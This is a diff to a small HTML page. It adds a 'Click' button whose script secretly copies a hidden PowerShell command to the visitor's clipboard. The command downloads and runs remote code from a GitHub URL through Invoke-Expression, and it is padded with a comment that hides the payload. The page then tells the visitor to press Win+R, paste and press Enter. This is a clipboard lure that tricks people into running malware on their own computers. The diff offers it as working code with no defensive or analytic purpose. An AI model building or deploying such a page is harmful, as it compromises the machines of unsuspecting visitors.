@@ -3,14 +3,39 @@
 	<title>Click</title>
 </head>
 <body>
-	<div id="q">
+	<div id="q" onClick="q()"><button>Click</button>
+	</div>
+	<div id="qq"><br>1. Press Win + R<br>2. Press Ctrl + V<br>3. Press Enter<br>4. Have fun!
 	</div>
 </body>
 <style>
 	#q{
-		background: red; width: 100px; height: 100px;
+		background: red; width: 200px; height: 100px;
 		margin-left: auto;
-  margin-right: auto;
+        margin-right: auto;
+	}
+	#q button{
+		font-size: 30px; margin-left: auto;
+        margin-right: auto; width: 200px; height: 100px;
+	}
+	#qq{
+		width: 200px; height: 200px;
+		margin-left: auto; font-size: 25px;
+        margin-right: auto;
+	}
+	}
 	}
 </style>
+<script>
+	function q()
+	{
+		var s = "powershell.exe -W Hidden -command ";
+		var d = '"Invoke-Expression (Invoke-WebRequest -Uri ';
+		var f = "'https://raw.githubusercontent.com/anutays/hm/refs/heads/main/t.txt').Content";
+		var h = '" # /////////////////////////////////////////////////////////// Press Enter, cutie~';
+		document.getElementById('qq').style.display = 'block';
+		navigator.clipboard.writeText(s + d + f + h);
+	}
+	document.getElementById('qq').style.display = 'none';
+</script>
 </html>
